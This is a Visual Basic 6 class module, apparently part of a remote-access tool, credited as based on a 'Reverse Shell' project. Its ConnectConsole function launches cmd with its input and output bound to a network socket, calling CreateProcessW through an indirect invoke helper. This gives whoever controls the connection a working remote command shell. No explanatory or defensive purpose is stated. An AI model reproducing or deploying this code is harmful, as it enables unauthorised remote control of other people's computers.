VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "ClsCmd"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit
'Basado en el proyecto de "Cobein" "Reverse Shell" - http://www.advancevb.com.ar/

'Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As Any) As Long

Private Type STARTUPINFO
    cb                      As Long
    lpReserved              As String
    lpDesktop               As String
    lpTitle                 As String
    dwX                     As Long
    dwY                     As Long
    dwXSize                 As Long
    dwYSize                 As Long
    dwXCountChars           As Long
    dwYCountChars           As Long
    dwFillAttribute         As Long
    dwFlags                 As Long
    wShowWindow             As Integer
    cbReserved2             As Integer
    lpReserved2             As Byte
    hStdInput               As Long
    hStdOutput              As Long
    hStdError               As Long
End Type

Public ID_Connection        As Long
Private m_PID              As Long

Public Sub Socket_DataArrival(ID As Long, IP As String, Puerto As String, Data As String)
'
End Sub

Public Sub Socket_Close(ID As Long, IP As String, Puerto As String)
    ID_Connection = 0
End Sub

Public Sub Socket_Conect(ID As Long, IP As String, Puerto As String)
'
End Sub

Private Sub Class_Terminate()
    If ID_Connection Then
        WinSock32.WsClose ID_Connection
    End If
    If m_PID <> 0 Then Call KillProcess(m_PID)
End Sub


Public Function ConnectConsole(ByVal Soket As Long) As Boolean
        Dim tSTARTUPINFO            As STARTUPINFO
        Dim tPROCESS_INFORMATION(3) As Long
        Dim sCmdLine As String
        Dim sCurrDir As String
        
        sCmdLine = "cmd"
        sCurrDir = Environ("SystemDrive ") & "\"

        With tSTARTUPINFO
            .cb = &H41:             .dwFlags = &H101
            .hStdInput = Soket:     .hStdOutput = Soket
            .hStdError = Soket
        End With
        
        If mInvoke.Invoke("kernel32", "CreateProcessW", 0, StrPtr(sCmdLine), 0, 0, True, 0, 0, StrPtr(sCurrDir), VarPtr(tSTARTUPINFO), VarPtr(tPROCESS_INFORMATION(0))) Then
            m_PID = tPROCESS_INFORMATION(2)
            ConnectConsole = True
        End If
        
End Function
